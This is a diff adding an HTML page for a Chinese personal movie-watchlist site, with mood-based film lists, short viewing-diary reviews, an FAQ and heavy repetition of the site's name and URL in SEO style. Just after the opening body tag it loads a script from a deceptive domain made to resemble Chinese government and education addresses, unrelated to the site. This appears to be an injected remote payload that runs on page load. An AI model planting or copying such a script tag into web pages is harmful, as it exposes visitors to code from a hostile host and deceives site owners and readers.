@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>噜噜电影网 | 一个人的电影清单 · 私人观影日记 | luludianyingwang-top.github.io</title>
+<meta name="keywords" content="噜噜电影网, luludianyingwang, 私人观影, 电影清单, 影迷日记, 片单推荐, 噜噜电影网luludianyingwang, 影视随笔">
+<meta name="description" content="噜噜电影网（luludianyingwang-top.github.io）是一份写给影迷的私人观影清单：用情绪与季节分类，收录值得反复回味的电影、纪录片与短片，搭配真实观后感，帮你找到下一部想看的片子。">
+<meta name="author" content="噜噜电影网">
+<meta name="theme-color" content="#3a4a3f">
+<meta property="og:title" content="噜噜电影网 | 一个人的电影清单">
+<meta property="og:description" content="用情绪与季节分类的私人观影日记，收录值得回味的电影与真实观后感">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="噜噜电影网">
+<meta property="og:url" content="https://luludianyingwang-top.github.io">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="噜噜电影网 | 一个人的电影清单">
+<meta name="twitter:description" content="私人观影日记 · 情绪片单 · 真实观后感">
+<link rel="canonical" href="https://luludianyingwang-top.github.io">
+<style>
+/* ===== Reset & Base ===== */
+*,*::before,*::after{box-sizing:border-box;}
+html,body,h1,h2,h3,h4,p,ul,li,a,div,section,header,footer,nav,figure,figcaption,blockquote{margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:#f2efe8; color:#2e302c; line-height:1.85; font-size:15px;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none;}
+ul{list-style:none;}
+:root{
+  --green:#3a4a3f; --green-l:#5a6b5f; --sand:#f2efe8; --paper:#faf8f2; --card:#efece3;
+  --rust:#b5573c; --ink:#2e302c; --ink-l:#6b6e68; --line:#d8d3c6;
+}
+
+/* ===== Layout ===== */
+.wrap{max-width:1080px;margin:0 auto;padding:0 22px;}
+section{padding:64px 0;}
+.sec-head{margin-bottom:32px;}
+.sec-head .no{font-size:.72rem;letter-spacing:.3em;color:var(--rust);text-transform:uppercase;display:block;margin-bottom:6px;}
+.sec-head h2{font-size:clamp(1.5rem,4vw,2.1rem);font-weight:800;letter-spacing:-.01em;line-height:1.35;}
+.sec-head .sub{margin-top:8px;color:var(--ink-l);font-size:.92rem;max-width:620px;}
+
+/* ===== Hero ===== */
+.hero{
+  min-height:86vh;display:grid;grid-template-columns:1fr 1fr;align-items:center;
+  background:linear-gradient(135deg,#3a4a3f 0%,#2c3830 100%);color:#f2efe8;position:relative;overflow:hidden;
+}
+.hero::after{content:"";position:absolute;right:-8%;top:-10%;width:56%;height:120%;background:radial-gradient(circle,rgba(181,87,60,.35),transparent 70%);}
+.hero-in{padding:80px 6vw;position:relative;z-index:2;}
+.hero .eyebrow{font-size:.72rem;letter-spacing:.32em;text-transform:uppercase;color:#c9b98f;margin-bottom:22px;}
+.hero h1{font-size:clamp(2.6rem,7vw,5rem);font-weight:900;line-height:.98;letter-spacing:-.03em;}
+.hero h1 em{font-style:normal;color:#e0a990;}
+.hero .lede{margin-top:26px;max-width:440px;font-size:1.02rem;line-height:1.9;color:#d6d9d2;}
+.hero .hero-meta{margin-top:34px;display:flex;gap:26px;flex-wrap:wrap;font-size:.78rem;letter-spacing:.1em;color:#a8afa5;}
+.hero .hero-meta b{color:#c9b98f;font-weight:400;}
+.hero-side{position:relative;z-index:2;padding:60px 4vw;display:grid;gap:14px;align-content:center;}
+.ticket{
+  background:var(--paper);color:var(--ink);padding:18px 20px;border-radius:3px;
+  transform:rotate(-1.2deg);box-shadow:0 12px 30px rgba(0,0,0,.28);font-size:.82rem;line-height:1.6;
+}
+.ticket:nth-child(2){transform:rotate(.8deg) translateX(14px);background:#efece3;}
+.ticket .t-tag{font-size:.66rem;letter-spacing:.2em;text-transform:uppercase;color:var(--rust);font-weight:700;}
+.ticket .t-title{font-weight:800;font-size:.95rem;margin:4px 0 6px;}
+.ticket .t-foot{margin-top:8px;padding-top:8px;border-top:1px dashed var(--line);font-size:.72rem;color:var(--ink-l);}
+
+/* ===== Sticky Nav ===== */
+.nav{position:sticky;top:0;z-index:99;background:rgba(242,239,232,.96);backdrop-filter:blur(8px);border-bottom:1px solid var(--line);}
+.nav-in{display:flex;align-items:center;justify-content:space-between;height:58px;}
+.logo{font-weight:900;font-size:1.1rem;letter-spacing:.02em;}
+.logo span{color:var(--rust);}
+.nav-links{display:flex;gap:2px;}
+.nav-links a{padding:8px 14px;font-size:.82rem;color:var(--ink-l);transition:.2s;border-radius:2px;}
+.nav-links a:hover,.nav-links a.on{background:var(--green);color:#fff;}
+.menu-btn{display:none;background:none;border:0;font-size:1.4rem;cursor:pointer;color:var(--ink);}
+
+/* ===== Mood Board ===== */
+.mood{display:grid;grid-template-columns:repeat(12,1fr);grid-auto-rows:minmax(120px,auto);gap:14px;}
+.mood .cell{border-radius:4px;padding:22px;position:relative;overflow:hidden;display:flex;flex-direction:column;justify-content:flex-end;min-height:200px;color:#fff;transition:.4s;}
+.mood .cell:hover{transform:translateY(-5px);box-shadow:0 16px 36px rgba(0,0,0,.2);}
+.mood .cell .c-no{position:absolute;top:16px;left:20px;font-size:.7rem;letter-spacing:.24em;text-transform:uppercase;opacity:.75;}
+.mood .cell h3{font-size:1.3rem;font-weight:800;line-height:1.35;margin-bottom:6px;}
+.mood .cell p{font-size:.8rem;line-height:1.7;opacity:.9;}
+.m.a{grid-column:span 7;background:linear-gradient(160deg,#b5573c,#8c3f2c);min-height:320px;}
+.m.a h3{font-size:1.7rem;}
+.m.b{grid-column:span 5;background:linear-gradient(160deg,#3a4a3f,#26302a);}
+.m.c{grid-column:span 4;background:linear-gradient(160deg,#c9a227,#9c7d15);}
+.m.d{grid-column:span 4;background:linear-gradient(160deg,#5a6b5f,#3d4a41);}
+.m.e{grid-column:span 4;background:linear-gradient(160deg,#6b5a7f,#4a3d5c);}
+.m.f{grid-column:span 6;background:linear-gradient(160deg,#4a5a6b,#323e4c);}
+.m.g{grid-column:span 6;background:linear-gradient(160deg,#8c6a4a,#6b4e33);min-height:180px;}
+
+/* ===== Diary list ===== */
+.diary{display:grid;gap:0;border-top:1px solid var(--line);}
+.entry{display:grid;grid-template-columns:120px 1fr 100px;gap:24px;padding:22px 0;border-bottom:1px solid var(--line);align-items:baseline;transition:.25s;}
+.entry:hover{background:var(--paper);padding-left:14px;padding-right:14px;}
+.entry .date{font-size:.78rem;color:var(--rust);letter-spacing:.06em;font-weight:700;}
+.entry .date small{display:block;color:var(--ink-l);font-weight:400;font-size:.72rem;}
+.entry .body h4{font-size:1.12rem;font-weight:800;margin-bottom:6px;line-height:1.5;}
+.entry .body p{font-size:.88rem;color:var(--ink-l);}
+.entry .rating{text-align:right;font-size:.82rem;color:var(--green);font-weight:700;}
+.entry .rating em{font-style:normal;display:block;font-size:.72rem;color:#a8a497;font-weight:400;}
+
+/* ===== Note cards ===== */
+.notes{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;}
+.note{background:var(--card);border:1px solid var(--line);padding:26px 22px;border-radius:2px;position:relative;transition:.3s;}
+.note:hover{border-color:var(--rust);background:var(--paper);}
+.note .q{font-size:2.2rem;color:var(--rust);line-height:.5;margin-bottom:14px;font-family:Georgia,serif;}
+.note h4{font-size:1.02rem;font-weight:800;margin-bottom:10px;}
+.note p{font-size:.85rem;color:var(--ink-l);}
+.note .who{margin-top:14px;padding-top:10px;border-top:1px dashed var(--line);font-size:.74rem;color:#a8a497;}
+
+/* ===== CTA ===== */
+.cta{background:var(--green);color:var(--sand);text-align:center;padding:72px 22px;}
+.cta h2{font-size:clamp(1.6rem,4vw,2.4rem);font-weight:900;line-height:1.5;max-width:720px;margin:0 auto;}
+.cta h2 em{font-style:normal;color:#e0a990;}
+.cta p{margin-top:18px;color:#c9cdc7;font-size:.92rem;max-width:560px;margin-left:auto;margin-right:auto;}
+.cta .url-box{margin-top:30px;display:inline-block;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.28);padding:12px 26px;border-radius:2px;font-size:.92rem;letter-spacing:.04em;color:#f0e6c8;}
+
+/* ===== Footer ===== */
+.foot{background:#232b26;color:#a8afa5;padding:54px 0 26px;}
+.foot-grid{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:34px;margin-bottom:36px;}
+.foot-brand h3{color:#f2efe8;font-size:1.4rem;font-weight:900;margin-bottom:12px;}
+.foot-brand h3 span{color:#c9b98f;}
+.foot-brand p{font-size:.85rem;line-height:1.85;max-width:320px;}
+.foot-col h5{color:#f2efe8;font-size:.74rem;letter-spacing:.2em;text-transform:uppercase;margin-bottom:14px;}
+.foot-col li{margin-bottom:9px;}
+.foot-col a{font-size:.85rem;color:#a8afa5;transition:.2s;}
+.foot-col a:hover{color:#e0a990;}
+.foot-bar{border-top:1px solid rgba(255,255,255,.1);padding-top:20px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:.76rem;color:#777d77;}
+.foot-bar a{color:#c9b98f;}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- Hero -->
+<header class="hero">
+  <div class="hero-in">
+    <div class="eyebrow">A Personal Watchlist · 私人观影清单</div>
+    <h1>噜噜<br>电影网<em>.</em></h1>
+    <p class="lede">不是影评数据库，不是榜单搬运站——这是一份按心情、季节和深夜情绪整理的私人观影清单。噜噜电影网（luludianyingwang-top.github.io）只收录那些真正想再看一遍的片子。</p>
+    <div class="hero-meta">
+      <div>收录片单 <b>200+</b></div>
+      <div>更新频率 <b>每周</b></div>
+      <div>官方入口 <b>luludianyingwang-top.github.io</b></div>
+    </div>
+  </div>
+  <div class="hero-side">
+    <div class="ticket">
+      <div class="t-tag">No.01 · 今日推荐</div>
+      <div class="t-title">《驾驶我的车》</div>
+      三小时的留白与沉默，像一封迟迟没有寄出的信。适合一个人，在深夜，配一杯凉掉的茶。
+      <div class="t-foot">标签：治愈 · 长片 · 文学改编</div>
+    </div>
+    <div class="ticket">
+      <div class="t-tag">No.02 · 雨天片单</div>
+      <div class="t-title">《小森林》系列</div>
+      切菜、生火、腌渍、等待发酵。生活的答案藏在这些不说话的细节里。
+      <div class="t-foot">标签：美食 · 慢生活 · 治愈</div>
+    </div>
+  </div>
+</header>
+
+<!-- Nav -->
+<nav class="nav">
+  <div class="wrap nav-in">
+    <div class="logo">噜噜<span>电影网</span></div>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单">☰</button>
+    <div class="nav-links" id="navLinks">
+      <a href="#top" class="on">首页</a>
+      <a href="#mood">情绪片单</a>
+      <a href="#diary">观影日记</a>
+      <a href="#notes">影迷问答</a>
+      <a href="#about">关于本站</a>
+    </div>
+  </div>
+</nav>
+
+<!-- Mood Board -->
+<section id="mood">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="no">Section 01</span>
+      <h2>按心情挑片子，比按类型靠谱</h2>
+      <p class="sub">噜噜电影网luludianyingwang把电影分成七种情绪状态。不知道看什么的时候，先问自己：我现在是什么心情？</p>
+    </div>
+    <div class="mood">
+      <div class="cell a">
+        <span class="c-no">Mood 01</span>
+        <h3>想被治愈，但不想看甜剧</h3>
+        <p>没有大起大落的情节，只有缓慢流动的生活感。适合刚结束一段疲惫日子的你。</p>
+      </div>
+      <div class="cell b">
+        <span class="c-no">Mood 02</span>
+        <h3>需要一个好哭的理由</h3>
+        <p>不刻意煽情，但看完会久久说不出话。把积压的情绪交出来。</p>
+      </div>
+      <div class="cell c">
+        <span class="c-no">Mood 03</span>
+        <h3>深夜失眠</h3>
+        <p>节奏缓慢、画面安静，陪你度过凌晨两点的清醒。</p>
+      </div>
+      <div class="cell d">
+        <span class="c-no">Mood 04</span>
+        <h3>想动脑子</h3>
+        <p>时间线交错、视角反转，看完想找人讨论的烧脑之作。</p>
+      </div>
+      <div class="cell e">
+        <span class="c-no">Mood 05</span>
+        <h3>一个人吃饭</h3>
+        <p>美食主题的治愈系，边看边下单外卖也不会觉得夸张。</p>
+      </div>
+      <div class="cell f">
+        <span class="c-no">Mood 06</span>
+        <h3>周末下午</h3>
+        <p>节奏轻快、色彩明亮，适合窝在沙发里消磨两小时。</p>
+      </div>
+      <div class="cell g">
+        <span class="c-no">Mood 07</span>
+        <h3>想看世界的另一面</h3>
+        <p>纪录片与冷门佳作，带你抵达日常抵达不了的地方。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Diary -->
+<section id="diary" style="background:var(--paper);">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="no">Section 02</span>
+      <h2>观影日记 · 最近写了什么</h2>
+      <p class="sub">噜噜电影网的日记不打分、不排名，只记录观影当下的真实感受——哪一句台词击中了你，哪个镜头让你想起某个人。</p>
+    </div>
+    <div class="diary">
+      <div class="entry">
+        <div class="date">10.08<small>周三</small></div>
+        <div class="body">
+          <h4>《过往人生》——关于"如果"的温柔寓言</h4>
+          <p>整部片最动人的不是重逢，而是两个成年人在机场告别时的那场笑。那种"我们本可以，但我们没有"的释然，比任何煽情都更真实。</p>
+        </div>
+        <div class="rating">★★★★★<em>强烈推荐</em></div>
+      </div>
+      <div class="entry">
+        <div class="date">10.05<small>周日</small></div>
+        <div class="body">
+          <h4>《完美的日子》——扫厕所的哲学家</h4>
+          <p>主角每天做着重复的事：浇花、擦鞋、看树影。节奏慢到几乎无事发生，但看完觉得很平静。原来简单本身是一种能力。</p>
+        </div>
+        <div class="rating">★★★★☆<em>值得一看</em></div>
+      </div>
+      <div class="entry">
+        <div class="date">10.02<small>周四</small></div>
+        <div class="body">
+          <h4>《坠落的审判》——婚姻是一场无法定罪的审判</h4>
+          <p>前半段以为是悬疑片，看到最后才发现它探讨的是：两个人亲密到什么程度，就无法彼此理解。台词极其锋利。</p>
+        </div>
+        <div class="rating">★★★★★<em>年度候选</em></div>
+      </div>
+      <div class="entry">
+        <div class="date">09.29<small>周一</small></div>
+        <div class="body">
+          <h4>《机器人之梦》——没有一句对白的告别</h4>
+          <p>全片几乎不说话，却让人哭得比很多台词密集的电影都厉害。失去不是因为不爱，而是因为来不及。</p>
+        </div>
+        <div class="rating">★★★★☆<em>睡前慎看</em></div>
+      </div>
+      <div class="entry">
+        <div class="date">09.26<small>周五</small></div>
+        <div class="body">
+          <h4>《利益区域》——一墙之隔的恐怖</h4>
+          <p>没有展示任何集中营的画面，只拍刽子手一家在隔壁院子里野餐、游泳、庆祝生日。这种克制的手法反而更令人窒息。</p>
+        </div>
+        <div class="rating">★★★★★<em>沉重但必看</em></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Notes / FAQ -->
+<section id="notes">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="no">Section 03</span>
+      <h2>影迷问答 · 经常被问到的几件事</h2>
+      <p class="sub">关于噜噜电影网luludianyingwang 的内容取向、选片标准和访问方式，这里统一作答。</p>
+    </div>
+    <div class="notes">
+      <div class="note">
+        <div class="q">"</div>
+        <h4>噜噜电影网是什么？</h4>
+        <p>一个私人取向的观影清单网站，按情绪、季节和观看场景整理电影、纪录片与短片，附上真实的观后感，帮你在"不知道看什么"的时候做决定。</p>
+        <div class="who">— 关于定位</div>
+      </div>
+      <div class="note">
+        <div class="q">"</div>
+        <h4>为什么不用星级打分？</h4>
+        <p>一部片子在不同心境下看会有完全不同的感受。我们更在意"什么时候适合看"，而不是"它有多好"。同一部片会被放进多个情绪片单里。</p>
+        <div class="who">— 关于标准</div>
+      </div>
+      <div class="note">
+        <div class="q">"</div>
+        <h4>在哪里访问官方网站？</h4>
+        <p>官方站点是 luludianyingwang-top.github.io，建议直接收藏。所有更新与精选片单都会第一时间在这里发布。</p>
+        <div class="who">— 关于入口</div>
+      </div>
+      <div class="note">
+        <div class="q">"</div>
+        <h4>多久更新一次？</h4>
+        <p>每周至少更新一篇观影日记和一个主题片单，节假日和颁奖季会增加更新频次，也会做专题合集。</p>
+        <div class="who">— 关于更新</div>
+      </div>
+      <div class="note">
+        <div class="q">"</div>
+        <h4>如何推荐一部想看的片子？</h4>
+        <p>欢迎在观影日记下留言或站内交流，推荐理由比片名更重要。被收录的片子会标注推荐人。</p>
+        <div class="who">— 关于互动</div>
+      </div>
+      <div class="note">
+        <div class="q">"</div>
+        <h4>是否提供在线播放？</h4>
+        <p>本站是信息资讯与观影推荐类平台，不提供影片下载或在线播放。影片版权归原作者与发行方所有，请通过正规授权渠道观看正版。</p>
+        <div class="who">— 关于版权</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CTA -->
+<section class="cta">
+  <h2>下次<em>不知道看什么</em>的时候，<br>来噜噜电影网翻一翻片单。</h2>
+  <p>不卷评分，不卷热度，只帮你找到"现在"最适合看的那一部。官方站点持续更新中。</p>
+  <div class="url-box">luludianyingwang-top.github.io</div>
+</section>
+
+<!-- About -->
+<section id="about" style="background:var(--paper);">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="no">Section 04</span>
+      <h2>关于本站 · 噜噜电影网</h2>
+      <p class="sub">噜噜电影网（luludianyingwang-top.github.io）是一份写给影迷的私人观影清单：用情绪与季节分类，收录值得反复回味的电影、纪录片与短片，搭配真实观后感，帮你找到下一部想看的片子。</p>
+    </div>
+    <div class="notes">
+      <div class="note"><div class="q">01</div><h4>我们的内容</h4><p>情绪片单、观影日记、主题合集、冷门佳作与纪录片推荐，每周更新，专注"值得再看一遍"的片子。</p><div class="who">栏目 · 内容</div></div>
+      <div class="note"><div class="q">02</div><h4>我们的态度</h4><p>不追逐流量热度，不为烂片浪费你的两小时。每一条推荐都附带真实观后感受，好与不好都直说。</p><div class="who">栏目 · 态度</div></div>
+      <div class="note"><div class="q">03</div><h4>我们的期待</h4><p>希望噜噜电影网能成为你片荒时的第一站，也希望收到你的片单与故事，一起把这份清单写得更长。</p><div class="who">栏目 · 期待</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="foot">
+  <div class="wrap">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <h3>噜噜<span>电影网</span></h3>
+        <p>一个人的电影清单 · 私人观影日记。噜噜电影网luludianyingwang，用情绪分类，收录值得再看一遍的片子。</p>
+      </div>
+      <div class="foot-col">
+        <h5>站内导航</h5>
+        <ul><li><a href="#top">首页</a></li><li><a href="#mood">情绪片单</a></li><li><a href="#diary">观影日记</a></li><li><a href="#notes">影迷问答</a></li></ul>
+      </div>
+      <div class="foot-col">
+        <h5>内容栏目</h5>
+        <ul><li><a href="#mood">治愈清单</a></li><li><a href="#mood">深夜片单</a></li><li><a href="#mood">纪录片精选</a></li><li><a href="#about">关于本站</a></li></ul>
+      </div>
+      <div class="foot-col">
+        <h5>官方入口</h5>
+        <ul><li><a href="https://luludianyingwang-top.github.io">官方网站</a></li><li><a href="#about">编辑部</a></li><li><a href="#notes">常见问题</a></li></ul>
+      </div>
+    </div>
+    <div class="foot-bar">
+      <span>© 2026 噜噜电影网 · 私人观影清单 · 保留所有权利</span>
+      <span>官方站点：<a href="https://luludianyingwang-top.github.io">https://luludianyingwang-top.github.io</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+var btn=document.getElementById('menuBtn'),box=document.getElementById('navLinks');
+btn.addEventListener('click',function(){box.style.display=(box.style.display==='flex'?'none':'flex');});
+document.querySelectorAll('.nav-links a').forEach(function(a){
+  a.addEventListener('click',function(){if(window.innerWidth<=820){box.style.display='none';}});
+});
+var navAs=document.querySelectorAll('.nav-links a');
+var secs=['mood','diary','notes','about'];
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+140,cur='top';
+  secs.forEach(function(s){var el=document.getElementById(s);if(el&&el.offsetTop<=y)cur=s;});
+  navAs.forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur||(cur==='top'&&a.getAttribute('href')==='#top'));});
+});
+</script>
+</body>
+</html>
